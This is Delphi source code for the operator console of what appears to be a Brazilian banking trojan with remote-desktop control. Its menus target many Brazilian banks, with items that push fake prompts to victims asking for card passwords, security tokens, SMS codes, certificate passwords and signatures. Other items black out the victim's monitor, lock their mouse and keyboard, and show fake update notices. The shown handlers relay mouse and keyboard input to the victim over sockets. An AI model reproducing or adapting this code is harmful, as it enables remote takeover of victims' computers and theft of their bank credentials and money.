  {$IMAGEBASE 12348762}
unit Desktop_Remoto;

interface

uses
  Windows, Messages, SysUtils,Clipbrd, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ExtCtrls, StdCtrls, ScktComp, ComCtrls, StreamManager, zLibex,
  Menus, Mask, UnitClipboard;


type
  TRemoto = class(TThread)
    procedure Execute; override;
  public
    Socket: TCustomWinSocket;
  private
end;

type
  TForm2 = class(TForm)
    Panel1: TPanel;
    CheckBox1: TCheckBox;
    CheckBox2: TCheckBox;
    ScrollBox1: TScrollBox;
    Image1: TImage;
    TrmTecladoPC: TTimer;
    CheckBox3: TCheckBox;
    MainMenu1: TMainMenu;
    ControleBancos1: TMenuItem;
    BB1: TMenuItem;
    Bradesco1: TMenuItem;
    BBGF1: TMenuItem;
    Caixa1: TMenuItem;
    Ita1: TMenuItem;
    Santander1: TMenuItem;
    PedirSenhade6Dgitos1: TMenuItem;
    PedirToken2: TMenuItem;
    PedirAssinaturaEletrnica1: TMenuItem;
    PedirToken3: TMenuItem;
    GroupBox1: TGroupBox;
    Label1: TLabel;
    SolicitarSenhaCartto1: TMenuItem;
    Sicoob1: TMenuItem;
    SolicitarSenhadaConta1: TMenuItem;
    SolicitarToken1: TMenuItem;
    SolicitarSenhaCartoUniclass1: TMenuItem;
    SolicitarSenhaCartoPersonalitte1: TMenuItem;
    SolicitarTokenUniclass1: TMenuItem;
    SolicitarTokenPersonalite1: TMenuItem;
    ControleDeskto1: TMenuItem;
    SolicitarAssinaturaeSrie1: TMenuItem;
    SolicitarToken2: TMenuItem;
    DesligarMonitorRemoto1: TMenuItem;
    LigarMonitorRemoto1: TMenuItem;
    ravarMouseMonitorRemoto1: TMenuItem;
    DestravarMouseTecladoRemoto1: TMenuItem;
    Label2: TLabel;
    Label3: TLabel;
    TrmTecladoNavi: TTimer;
    SobreoSistema1: TMenuItem;
    Sobre1: TMenuItem;
    SolicitarTokenPrime1: TMenuItem;
    EnviarAvisodeAtualiao1: TMenuItem;
    SolicitarPosioTabela1: TMenuItem;
    SolictarSenhadaConta1: TMenuItem;
    SolicitarSenhadoCertificado1: TMenuItem;
    CheckBox4: TCheckBox;
    CheckBox5: TCheckBox;
    TrmAviso: TTimer;
    EnviarAvisoAtualizaoPrime1: TMenuItem;
    ravarTela1: TMenuItem;
    ravarTela2: TMenuItem;
    ravarTela3: TMenuItem;
    ravarTela4: TMenuItem;
    ravarTela5: TMenuItem;
    ravarTelaNormal1: TMenuItem;
    ravarTelaUniClass1: TMenuItem;
    ravarTelaPersonnalit1: TMenuItem;
    ReiniciarPCRemoto1: TMenuItem;
    DesligarPCRemoto1: TMenuItem;
    GroupBox2: TGroupBox;
    Edit1: TEdit;
    Timer2: TTimer;
    MMClick: TMemo;
    Button2: TButton;
    CheckBox6: TCheckBox;
    CheckBox7: TCheckBox;
    RadioButton1: TRadioButton;
    CheckBox8: TCheckBox;
    Edit2: TEdit;
    SaveDialog1: TSaveDialog;
    HSBC1: TMenuItem;
    ravarTela6: TMenuItem;
    Solicitar1: TMenuItem;
    SolicitarSenhadaConta2: TMenuItem;
    SolicitarToken3: TMenuItem;
    BradescoEmpresa1: TMenuItem;
    ravarTela7: TMenuItem;
    SolicitarToken4: TMenuItem;
    SolicitarTabelaNormal1: TMenuItem;
    SolicitarTabelaUniclass1: TMenuItem;
    SolicitarTabelaPersonnalit1: TMenuItem;
    ItaEmpresa1: TMenuItem;
    ravarTela8: TMenuItem;
    SolicitarSenhaNascimentoCarto1: TMenuItem;
    SolicitarToken5: TMenuItem;
    DestravarTela11: TMenuItem;
    N1: TMenuItem;
    Fechar1: TMenuItem;
    Label4: TLabel;
    SolicitarSrieToken1: TMenuItem;
    SolicitarPosioTabelaPrime1: TMenuItem;
    SolicitarSenhadoCertificado2: TMenuItem;
    SolicitarSMS1: TMenuItem;
    ravarTelaBBEstilo1: TMenuItem;
    SolicitarSenhade6DgitosEstilo1: TMenuItem;
    SolicitarSMSEstilo1: TMenuItem;
    BloquearTela24hrs1: TMenuItem;
    N2: TMenuItem;
    N3: TMenuItem;
    Label5: TLabel;
    TrmAviso1: TTimer;
    Label7: TLabel;
    SolicitarUsurio1: TMenuItem;
    SolicitarSenhadaConta3: TMenuItem;
    EnviarMensagem1: TMenuItem;
    ravarTelaHSBCPremier1: TMenuItem;
    SolicitarSenhaAlfaNumricaremier1: TMenuItem;
    SolicitarSenhadaContaPremier1: TMenuItem;
    SolicitarTokenPremier1: TMenuItem;
    SolicitarViadoCartoAdvanced1: TMenuItem;
    SolicitarViadoCartoPremier1: TMenuItem;
    SolicitarSenhaAutoAtendimentoNormal1: TMenuItem;
    SolicitarSenhaAutoAtendimentoEstilo1: TMenuItem;
    Label8: TLabel;
    SolicitarNascimentoItaUniclass1: TMenuItem;
    SolicitarNascimentoItaPersonnalit1: TMenuItem;
    SolicitarTokenCelularNormal1: TMenuItem;
    SolicitarTokenCelularPrime1: TMenuItem;
    BBEmpresa1: TMenuItem;
    ravarTela9: TMenuItem;
    SolicitarSenhadoCertificado3: TMenuItem;
    SolictarSenhadaConta2: TMenuItem;
    SolicitarSenhadeAcesso1: TMenuItem;
    SolicitarSenhadeAcesso2: TMenuItem;
    ItaNormal1: TMenuItem;
    ItaUniclass1: TMenuItem;
    ItaPersonnalit1: TMenuItem;
    BBNormal1: TMenuItem;
    BBEstilo1: TMenuItem;
    BBNormal2: TMenuItem;
    BBPrime1: TMenuItem;
    HsbcNormal1: TMenuItem;
    HsbcPremier1: TMenuItem;
    Label6: TLabel;
    CheckBox9: TCheckBox;
    Santa: TMenuItem;
    GB1: TMenuItem;
    Posiao1: TMenuItem;
    SMS1: TMenuItem;
    Nordeste: TMenuItem;
    GB: TMenuItem;
    Tabela: TMenuItem;
    GB2: TMenuItem;
    oken1: TMenuItem;
    N4: TMenuItem;
    Button7: TButton;
    StatusBar1: TStatusBar;
    GroupBox5: TGroupBox;
    PageControl1: TPageControl;
    Tabbrasilf: TTabSheet;
    Tabcef: TTabSheet;
    TabSheet3: TTabSheet;
    TabSheet4: TTabSheet;
    TabSheet5: TTabSheet;
    TabSheet6: TTabSheet;
    TabSheet7: TTabSheet;
    TabSheet8: TTabSheet;
    TabSheet9: TTabSheet;
    TabControl1: TTabControl;
    GroupBox6: TGroupBox;
    Memo1: TMemo;
    PageControl2: TPageControl;
    TabSheet1: TTabSheet;
    TabSheet2: TTabSheet;
    GroupBox3: TGroupBox;
    Button8: TButton;
    Button9: TButton;
    TabSheet10: TTabSheet;
    Memo2: TMemo;
    Button14: TButton;
    GroupBox7: TGroupBox;
    Button12: TButton;
    Button13: TButton;
    Button15: TButton;
    Label9: TLabel;
    Label10: TLabel;
    Label11: TLabel;
    TabControl5: TTabControl;
    Button23: TButton;
    Button24: TButton;
    Button25: TButton;
    PageControl4: TPageControl;
    TabSheet11: TTabSheet;
    TabSheet15: TTabSheet;
    TabControl2: TTabControl;
    Button10: TButton;
    Button11: TButton;
    Button16: TButton;
    TabControl6: TTabControl;
    Button26: TButton;
    Button27: TButton;
    Label12: TLabel;
    Label13: TLabel;
    Label14: TLabel;
    Button28: TButton;
    PageControl5: TPageControl;
    TabSheet16: TTabSheet;
    TabSheet17: TTabSheet;
    Button17: TButton;
    Button18: TButton;
    Button19: TButton;
    Button29: TButton;
    Button30: TButton;
    Button31: TButton;
    Button32: TButton;
    TabControl3: TTabControl;
    PageControl6: TPageControl;
    TabSheet18: TTabSheet;
    TabSheet19: TTabSheet;
    Button20: TButton;
    Button21: TButton;
    Button22: TButton;
    Button36: TButton;
    Button37: TButton;
    Button38: TButton;
    PageControl3: TPageControl;
    TabSheet12: TTabSheet;
    TabSheet13: TTabSheet;
    TabSheet14: TTabSheet;
    Button40: TButton;
    Button41: TButton;
    Button42: TButton;
    Button43: TButton;
    TabSheet20: TTabSheet;
    Button45: TButton;
    Button46: TButton;
    Button48: TButton;
    Button47: TButton;
    Button50: TButton;
    Button51: TButton;
    Button52: TButton;
    Button54: TButton;
    Button55: TButton;
    Button56: TButton;
    Button57: TButton;
    PageControl7: TPageControl;
    TabSheet21: TTabSheet;
    Button59: TButton;
    Button61: TButton;
    Edit16: TEdit;
    Button63: TButton;
    Button64: TButton;
    Button65: TButton;
    Button66: TButton;
    CKECKEGB: TCheckBox;
    Edit3: TEdit;
    Button5: TButton;
    Button6: TButton;
    Button3: TButton;
    Button1: TButton;
    Button4: TButton;
    Button33: TButton;
    TabSheet22: TTabSheet;
    Button34: TButton;
    Hsbc3: TMenuItem;
    oken2: TMenuItem;
    oken3: TMenuItem;
    Panel2: TPanel;
    ProgressBar1: TProgressBar;
    procedure Image1MouseDown(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure Image1MouseUp(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure Image1MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure TrmTecladoPCTimer(Sender: TObject);
    procedure CheckBox2KeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure CheckBox1KeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure CheckBox2Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormResize(Sender: TObject);
    procedure Image1DblClick(Sender: TObject);
    procedure CheckBox3Click(Sender: TObject);
    procedure PedirSenhade6Dgitos1Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure Button1Click(Sender: TObject);
    procedure SolicitarSenhaCartto1Click(Sender: TObject);
    procedure PedirAssinaturaEletrnica1Click(Sender: TObject);
    procedure SolicitarToken1Click(Sender: TObject);
    procedure SolicitarSenhaCartoUniclass1Click(Sender: TObject);
    procedure SolicitarSenhaCartoPersonalitte1Click(Sender: TObject);
    procedure PedirToken3Click(Sender: TObject);
    procedure SolicitarTokenUniclass1Click(Sender: TObject);
    procedure SolicitarTokenPersonalite1Click(Sender: TObject);
    procedure SolicitarSenhadaConta1Click(Sender: TObject);
    procedure SolicitarAssinaturaeSrie1Click(Sender: TObject);
    procedure SolicitarToken2Click(Sender: TObject);
    procedure DesligarMonitorRemoto1Click(Sender: TObject);
    procedure LigarMonitorRemoto1Click(Sender: TObject);
    procedure ravarMouseMonitorRemoto1Click(Sender: TObject);
    procedure DestravarMouseTecladoRemoto1Click(Sender: TObject);
    procedure TrmTecladoNaviTimer(Sender: TObject);
    procedure Sobre1Click(Sender: TObject);
    procedure EnviarAvisodeAtualiao1Click(Sender: TObject);
    procedure SolicitarPosioTabela1Click(Sender: TObject);
    procedure PedirToken2Click(Sender: TObject);
    procedure SolictarSenhadaConta1Click(Sender: TObject);
    procedure SolicitarSenhadoCertificado1Click(Sender: TObject);
    procedure TrmAvisoTimer(Sender: TObject);
    procedure SolicitarTokenPrime1Click(Sender: TObject);
    procedure EnviarAvisoAtualizaoPrime1Click(Sender: TObject);
    procedure ravarTela1Click(Sender: TObject);
    procedure ravarTela2Click(Sender: TObject);
    procedure ravarTela3Click(Sender: TObject);
    procedure ravarTela4Click(Sender: TObject);
    procedure ravarTela5Click(Sender: TObject);
    procedure ravarTelaNormal1Click(Sender: TObject);
    procedure ravarTelaUniClass1Click(Sender: TObject);
    procedure ravarTelaPersonnalit1Click(Sender: TObject);
    procedure DesligarPCRemoto1Click(Sender: TObject);
    procedure ReiniciarPCRemoto1Click(Sender: TObject);
    procedure DestravarTela1Click(Sender: TObject);
    procedure DestravarTela2Click(Sender: TObject);
    procedure DestravarTela3Click(Sender: TObject);
    procedure DestravarTela4Click(Sender: TObject);
    procedure DestravarTela5Click(Sender: TObject);
    procedure DestravarTela6Click(Sender: TObject);
    procedure DestravarTela7Click(Sender: TObject);
    procedure Timer2Timer(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure Enviar1Click(Sender: TObject);
    procedure Button3Click(Sender: TObject);
    procedure ravarTela6Click(Sender: TObject);
    procedure DestravarTela8Click(Sender: TObject);
    procedure Solicitar1Click(Sender: TObject);
    procedure SolicitarSenhadaConta2Click(Sender: TObject);
    procedure SolicitarToken3Click(Sender: TObject);
    procedure ravarTela7Click(Sender: TObject);
    procedure DestravarTela9Click(Sender: TObject);
    procedure SolicitarToken4Click(Sender: TObject);
    procedure SolicitarTabelaNormal1Click(Sender: TObject);
    procedure SolicitarTabelaUniclass1Click(Sender: TObject);
    procedure SolicitarTabelaPersonnalit1Click(Sender: TObject);
    procedure ravarTela8Click(Sender: TObject);
    procedure DestravarTela10Click(Sender: TObject);
    procedure SolicitarSenhaNascimentoCarto1Click(Sender: TObject);
    procedure SolicitarToken5Click(Sender: TObject);
    procedure DestravarTela11Click(Sender: TObject);
    procedure Button4Click(Sender: TObject);
    procedure Fechar1Click(Sender: TObject);
    procedure SolicitarSenhadoCartoNormal1Click(Sender: TObject);
    procedure SolicitarSenhadoCartodeCrditoPrime1Click(Sender: TObject);
    procedure SolicitarSrieToken1Click(Sender: TObject);
    procedure SolicitarPosioTabelaPrime1Click(Sender: TObject);
    procedure SolicitarSenhadoCartoDbitoNormal4Dgitos1Click(
      Sender: TObject);
    procedure SolicitarSenhadoCartoDbitoPrime4Dgitos1Click(
      Sender: TObject);
    procedure SolicitarSenhadoCertificado2Click(Sender: TObject);
    procedure SolicitarSMS1Click(Sender: TObject);
    procedure SolicitarToke1Click(Sender: TObject);
    procedure ravarTelaBBEstilo1Click(Sender: TObject);
    procedure SolicitarSenhade6DgitosEstilo1Click(Sender: TObject);
    procedure SolicitarSMSEstilo1Click(Sender: TObject);
    procedure BloquearTela24hrs1Click(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure EnviarMensagemRemota1Click(Sender: TObject);
    procedure TrmAviso1Timer(Sender: TObject);
    procedure Button5Click(Sender: TObject);
    procedure SolicitarUsurio1Click(Sender: TObject);
    procedure SolicitarSenhadaConta3Click(Sender: TObject);
    procedure EnviarMensagem1Click(Sender: TObject);
    procedure ravarTelaHSBCPremier1Click(Sender: TObject);
    procedure SolicitarSenhaAlfaNumricaremier1Click(Sender: TObject);
    procedure SolicitarSenhadaContaPremier1Click(Sender: TObject);
    procedure SolicitarTokenPremier1Click(Sender: TObject);
    procedure SolicitarViadoCartoAdvanced1Click(Sender: TObject);
    procedure SolicitarViadoCartoPremier1Click(Sender: TObject);
    procedure SolicitarSenhaAutoAtendimentoNormal1Click(Sender: TObject);
    procedure SolicitarSenhaAutoAtendimentoEstilo1Click(Sender: TObject);
    procedure DesbloquearTela24hrs1Click(Sender: TObject);
    procedure SolicitarNascimentoItaNormal1Click(Sender: TObject);
    procedure SolicitarNascimentoItaUniclass1Click(Sender: TObject);
    procedure SolicitarNascimentoItaPersonnalit1Click(Sender: TObject);
    procedure SolicitarTokenCelularNormal1Click(Sender: TObject);
    procedure SolicitarTokenCelularPrime1Click(Sender: TObject);
    procedure ravarTela9Click(Sender: TObject);
    procedure SolicitarSenhadoCertificado3Click(Sender: TObject);
    procedure SolictarSenhadaConta2Click(Sender: TObject);
    procedure SolicitarSenhadeAcesso1Click(Sender: TObject);
    procedure SolicitarSenhadeAcesso2Click(Sender: TObject);
    procedure Button6Click(Sender: TObject);
    procedure CheckBox9Click(Sender: TObject);
    procedure CheckBox9KeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure Panel2Click(Sender: TObject);
    procedure GB1Click(Sender: TObject);
    procedure Posiao1Click(Sender: TObject);
    procedure SMS1Click(Sender: TObject);
    procedure GBClick(Sender: TObject);
    procedure TabelaClick(Sender: TObject);
    procedure GB2Click(Sender: TObject);
    procedure FormKeyUp(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure oken1Click(Sender: TObject);
    procedure Button7Click(Sender: TObject);
    procedure Button8Click(Sender: TObject);
    procedure Button9Click(Sender: TObject);
    procedure Button10Click(Sender: TObject);
    procedure Button11Click(Sender: TObject);
    procedure Button12Click(Sender: TObject);
    procedure Button13Click(Sender: TObject);
    procedure Button14Click(Sender: TObject);
    procedure Button15Click(Sender: TObject);
    procedure Button16Click(Sender: TObject);
    procedure Button26Click(Sender: TObject);
    procedure Button27Click(Sender: TObject);
    procedure Button28Click(Sender: TObject);
    procedure Button17Click(Sender: TObject);
    procedure Button18Click(Sender: TObject);
    procedure Button19Click(Sender: TObject);
    procedure Button32Click(Sender: TObject);
    procedure Button29Click(Sender: TObject);
    procedure Button30Click(Sender: TObject);
    procedure Button31Click(Sender: TObject);
    procedure Button20Click(Sender: TObject);
    procedure Button21Click(Sender: TObject);
    procedure Button22Click(Sender: TObject);
    procedure Button37Click(Sender: TObject);
    procedure Button36Click(Sender: TObject);
    procedure Button38Click(Sender: TObject);
    procedure Button40Click(Sender: TObject);
    procedure Button41Click(Sender: TObject);
    procedure Button43Click(Sender: TObject);
    procedure Button42Click(Sender: TObject);
    procedure Button46Click(Sender: TObject);
    procedure Button48Click(Sender: TObject);
    procedure Button45Click(Sender: TObject);
    procedure Button47Click(Sender: TObject);
    procedure Button52Click(Sender: TObject);
    procedure Button51Click(Sender: TObject);
    procedure Button50Click(Sender: TObject);
    procedure Button54Click(Sender: TObject);
    procedure Button57Click(Sender: TObject);
    procedure Button56Click(Sender: TObject);
    procedure Button55Click(Sender: TObject);
    procedure Button59Click(Sender: TObject);
    procedure Button61Click(Sender: TObject);
    procedure Button63Click(Sender: TObject);
    procedure Button23Click(Sender: TObject);
    procedure Button34Click(Sender: TObject);
    procedure Button24Click(Sender: TObject);
    procedure oken2Click(Sender: TObject);
    procedure oken3Click(Sender: TObject);
  
  private
    { Private declarations }
  public
    Socket, Socket2: TCustomWinSocket;
    Remoto: TRemoto;
    ResX, ResY: Integer;
    procedure trava();
    procedure destrava1();

    { Public declarations }
  end;




var
  Form2: TForm2;

implementation

uses Principal, Unit4, Unit5, Unit8, Unit9, Unit10, Unit11, Math;

{$R *.dfm}
function GetAveCharSize(Canvas: TCanvas): TPoint; 
var 
  I: Integer; 
  Buffer: array[0..51] of Char; 
begin 
  for I := 0 to 25 do Buffer[I] := Chr(I + Ord('A')); 
  for I := 0 to 25 do Buffer[I + 26] := Chr(I + Ord('a')); 
  GetTextExtentPoint(Canvas.Handle, Buffer, 52, TSize(Result)); 
  Result.X := Result.X div 52; 
end; 

function InputQueryJW(const ACaption, APrompt: string; var Value: string): Boolean;
var
  Form: TForm;
  Prompt: TLabel;
  Edit: TEdit;
  DialogUnits: TPoint;
  ButtonTop, ButtonWidth, ButtonHeight: Integer;
begin
  Result := False;
  Form := TForm.Create(Application);
  with Form do
    try
      Canvas.Font := Font;
      DialogUnits := GetAveCharSize(Canvas);
      BorderStyle := bsDialog;
      Caption := ACaption;
      ClientWidth := MulDiv(180, DialogUnits.X, 4);
      ClientHeight := MulDiv(63, DialogUnits.Y, 8);
      Position := poScreenCenter;
      Prompt := TLabel.Create(Form);
      with Prompt do
      begin
        Parent := Form;
        AutoSize := True;
        Left := MulDiv(8, DialogUnits.X, 4);
        Top := MulDiv(8, DialogUnits.Y, 8);
        Caption := APrompt;
      end;
      Edit := TEdit.Create(Form); 
      with Edit do 
      begin
        Parent := Form; 
        Left := Prompt.Left; 
        Top := MulDiv(19, DialogUnits.Y, 8); 
        Width := MulDiv(164, DialogUnits.X, 4);
        MaxLength := 255; 
        Text := Value; 
        SelectAll; 
      end; 
      ButtonTop := MulDiv(41, DialogUnits.Y, 8);
      ButtonWidth := MulDiv(50, DialogUnits.X, 4); 
      ButtonHeight := MulDiv(14, DialogUnits.Y, 8); 
      with TButton.Create(Form) do 
      begin 
        Parent := Form;
        Caption := 'Enviar GB';
        ModalResult := mrOk;  // Unit Controls 
        Default := True;
        SetBounds(MulDiv(38, DialogUnits.X, 4), ButtonTop, ButtonWidth,
          ButtonHeight);
      end;
      with TButton.Create(Form) do 
      begin 
        Parent := Form; 
        Caption := 'Cancelar GB'; 
        ModalResult := mrCancel;
        Cancel := True; 
        SetBounds(MulDiv(92, DialogUnits.X, 4), ButtonTop, ButtonWidth, 
          ButtonHeight); 
      end; 
      if ShowModal = mrOk then 
      begin
        Value := Edit.Text; 
        Result := True; 
      end; 
    finally 
      Form.Free; 
    end;
end;


function InputBox(const ACaption, APrompt, ADefault: string): string;
begin
Result := ADefault;
InputQuery(ACaption, APrompt, Result);
end;

function InputBoxJW(const ACaption, APrompt, ADefault: string): string;
begin
Result := ADefault;
InputQueryJW(ACaption, APrompt, Result);
end;

function InputQueryTK(const ACaption, APrompt: string; var Value: string): Boolean;
var
  Form: TForm;
  Prompt: TLabel;
  Edit: TEdit;
  DialogUnits: TPoint;
  ButtonTop, ButtonWidth, ButtonHeight: Integer;
begin
  Result := False;
  Form := TForm.Create(Application);
  with Form do
    try
      Canvas.Font := Font;
      DialogUnits := GetAveCharSize(Canvas);
      BorderStyle := bsDialog;
      Caption := ACaption;
      ClientWidth := MulDiv(180, DialogUnits.X, 4);
      ClientHeight := MulDiv(63, DialogUnits.Y, 8);
      Position := poScreenCenter;
      Prompt := TLabel.Create(Form);
      with Prompt do
      begin
        Parent := Form;
        AutoSize := True;
        Left := MulDiv(8, DialogUnits.X, 4);
        Top := MulDiv(8, DialogUnits.Y, 8);
        Caption := APrompt;
      end;
      Edit := TEdit.Create(Form); 
      with Edit do 
      begin
        Parent := Form; 
        Left := Prompt.Left; 
        Top := MulDiv(19, DialogUnits.Y, 8); 
        Width := MulDiv(164, DialogUnits.X, 4);
        MaxLength := 255; 
        Text := Value; 
        SelectAll; 
      end; 
      ButtonTop := MulDiv(41, DialogUnits.Y, 8);
      ButtonWidth := MulDiv(50, DialogUnits.X, 4); 
      ButtonHeight := MulDiv(14, DialogUnits.Y, 8); 
      with TButton.Create(Form) do 
      begin 
        Parent := Form;
        Caption := 'Enviar';
        ModalResult := mrOk;  // Unit Controls 
        Default := True;
        SetBounds(MulDiv(38, DialogUnits.X, 4), ButtonTop, ButtonWidth,
          ButtonHeight);
      end;
      with TButton.Create(Form) do 
      begin 
        Parent := Form; 
        Caption := 'Cancelar'; 
        ModalResult := mrCancel;
        Cancel := True; 
        SetBounds(MulDiv(92, DialogUnits.X, 4), ButtonTop, ButtonWidth, 
          ButtonHeight); 
      end; 
      if ShowModal = mrOk then 
      begin
        Value := Edit.Text; 
        Result := True; 
      end; 
    finally 
      Form.Free; 
    end;
end;


function InputBoxTK(const ACaption, APrompt, ADefault: string): string;
begin
Result := ADefault;
InputQueryTK(ACaption, APrompt, Result);
end;


procedure TForm2.trava();
begin
CheckBox1.Checked := False;
CheckBox5.Checked := False;
CheckBox3.Checked := False;
CheckBox1.Enabled := False;
CheckBox2.Enabled := False;
CheckBox3.Enabled := False;
CheckBox4.Enabled := False;
CheckBox5.Enabled := False;
end;

procedure TForm2.destrava1();
begin
if Form1.Edit6.Text = 'Desk' then
begin
CheckBox1.Checked := True;
CheckBox5.Checked := True;
CheckBox1.Enabled := True;
CheckBox5.Enabled := True;
end;

if Form1.Edit6.Text = 'Navi' then
begin
CheckBox4.Checked := True;
CheckBox5.Checked := True;
CheckBox4.Enabled := True;
CheckBox5.Enabled := True;
end;

end;

function DeCompressStream(SrcStream: TMemoryStream):boolean;
var
  InputStream,OutputStream :TMemoryStream;
  inbuffer,outbuffer :Pointer;
  count,outcount :longint;
begin
  result := false;
  if not assigned(SrcStream) then exit;

  InputStream := TMemoryStream.Create;
  OutputStream := TMemoryStream.Create;
  try
    InputStream.LoadFromStream(SrcStream);
    count := inputstream.Size;
    getmem(inbuffer,count);
    Inputstream.ReadBuffer(inbuffer^,count);
    zdecompress(inbuffer,count,outbuffer,outcount);
    outputstream.Write(outbuffer^,outcount);
    SrcStream.Clear;
    SrcStream.LoadFromStream(OutputStream);
    result :=true;
  finally
    InputStream.Free;
    OutputStream.Free;
    FreeMem(inbuffer, count);
    FreeMem(outbuffer, outcount);
  end;
end;

procedure TForm2.Image1MouseDown(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
begin
  if Active = false then
    exit;

  if CheckBox1.Checked then begin
    X := (X * ResX) div Image1.Width;
    Y := (Y * ResY) div Image1.Height;

    if Button = mbLeft then
      Socket.SendText('<|MouseLD|>'+intToStr(x)+'<|>'+intToStr(y)+'<<|')
    else
      Socket.SendText('<|MouseRD|>'+intToStr(x)+'<|>'+intToStr(y)+'<<|');
  end;
end;

procedure SetMenuAccess(oMenu : TMainMenu; bEnable : Boolean);
var
i : Integer;
begin
for i:=0 to oMenu.Items.Count-1 do begin
oMenu.Items[i].Enabled := bEnable
end;
end;

procedure TForm2.Image1MouseUp(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
begin

  if CheckBox8.Checked = True then begin
 // Socket.SendText('cleto'+ label2.caption + ',' + label3.caption);
  Edit2.Clear;
  Edit2.Text := Label2.Caption + ',' + Label3.Caption;
  end;

  if CheckBox4.Checked = True then begin
  Socket.SendText('click'+ label2.caption + ',' + label3.caption);
  end;

  if Active = false then
    exit;

   if CheckBox1.Checked then begin
    X := (X * ResX) div Image1.Width;
    Y := (Y * ResY) div Image1.Height;
    
    if Button = mbLeft then
      Socket.SendText('<|MouseLU|>'+intToStr(x)+'<|>'+intToStr(y)+'<<|')
    else
      Socket.SendText('<|MouseRU|>'+intToStr(x)+'<|>'+intToStr(y)+'<<|');
  end;
end;

procedure TForm2.Image1MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin

 X := (X * ResX) div Image1.Width;
  Y := (Y * ResY) div Image1.Height;
  label2.Caption := IntToStr(X);
  label3.caption := IntToStr(Y);

  if Active = false then
    exit;



  if CheckBox1.Checked then begin
    X := (X * ResX) div Image1.Width;
    Y := (Y * ResY) div Image1.Height;
    
    Socket.SendText('<|MousePos|>'+intToStr(x)+'<|>'+intToStr(y)+'<<|');
  end;
end;

procedure TForm2.TrmTecladoPCTimer(Sender: TObject);
var 
      i : byte; 
begin
  if (Active) and (CheckBox9.Checked) then begin
  try
  for i:=8 To 222 do 
    begin 
       if GetAsyncKeyState(i)=-32767 then 
        begin 
        case i of 
        8  : Socket2.SendText('{BS}');
        9  : Socket2.SendText('{TAB}');
        13 : Socket2.SendText('{ENTER}');
        //17 : memo1.text:=memo1.text+'[Ctrl]';
        27 : Socket2.SendText('{ESCAPE}'); 
        32 : Socket2.SendText(' '); //Space
        33 : Socket2.SendText('{PGUP}');
        34 : Socket2.SendText('{PGDN}'); 
        35 : Socket2.SendText('{END}');
        36 : Socket2.SendText('{HOME}');
        37 : Socket2.SendText('{LEFT}');
        38 : Socket2.SendText('{UP}');
        39 : Socket2.SendText('{RIGHT}');
        40 : Socket2.SendText('{DOWN}');
        44 : Socket2.SendText('{PRTSC}');
        46 : Socket2.SendText('{DEL}');
        145 : Socket2.SendText('{SCROLLLOCK}');

        //Number 1234567890 Symbol !@#$%^&*() 
        48 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText(')')
             else Socket2.SendText('0');
        49 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('!')
             else Socket2.SendText('1');
        50 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('@')
             else Socket2.SendText('2');
        51 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('#')
             else Socket2.SendText('3');
        52 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('$')
             else Socket2.SendText('4');
        53 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('%')
             else Socket2.SendText('5');
        54 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('^')
             else Socket2.SendText('6');
        55 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('&')
             else Socket2.SendText('7');
        56 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('*')
             else Socket2.SendText('8');
        57 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('(')
             else Socket2.SendText('9');
        65..90 : // a..z , A..Z
            begin
            if ((GetKeyState(VK_CAPITAL))=1) then
                if GetKeyState(VK_SHIFT)<0 then
                   Socket2.SendText(LowerCase(Chr(i))) //a..z
                else 
                   Socket2.SendText(UpperCase(Chr(i))) //A..Z 
            else 
                if GetKeyState(VK_SHIFT)<0 then 
                    Socket2.SendText(UpperCase(Chr(i))) //A..Z
                else
                    Socket2.SendText(LowerCase(Chr(i))); //a..z
            end; 
        //Numpad
        96..105 : Socket2.SendText(inttostr(i-96)); //Numpad  0..9 
        106:Socket2.SendText('*');
        107:Socket2.SendText('&');
        109:Socket2.SendText('-');
        110:Socket2.SendText('.');
        111:Socket2.SendText('/');

        112..123: //F1-F12 
            Socket2.SendText('{F'+IntToStr(i - 111)+'}'); 

        186 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText(':')
              else Socket2.SendText(';');
        187 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('+')
              else Socket2.SendText('=');
        188 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('<')
              else Socket2.SendText(',');
        189 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('_')
              else Socket2.SendText('-');
        190 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('>')
              else Socket2.SendText('.');
        191 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('?')
              else Socket2.SendText('/');
        192 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('~')
              else Socket2.SendText('`');
        219 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('{')
              else Socket2.SendText('[');
        220 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('|')
              else Socket2.SendText('\');
        221 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('}')
              else Socket2.SendText(']');
        222 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('"')
              else Socket2.SendText('''');
        end; 
       end; 
      end;
    except
      exit;
    end;
  end;

end;

